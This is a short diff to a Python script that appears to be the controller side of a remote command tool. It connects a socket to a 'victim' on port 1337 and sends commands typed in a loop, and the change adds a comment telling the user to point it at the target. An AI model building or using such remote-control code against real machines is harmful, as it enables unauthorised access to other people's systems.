@@ -2,7 +2,7 @@
 import socket
 
 client_socket = socket.socket()
-client_socket.connect(('127.0.0.1',1337)) # Connecting to victim
+client_socket.connect(('127.0.0.1',1337)) # Connecting to victim, Change to the target if necessary
 command = input("Command: ")
 while command != 'exit': # Option to quit the connection
     if command == '': # avoiding sending no characters command
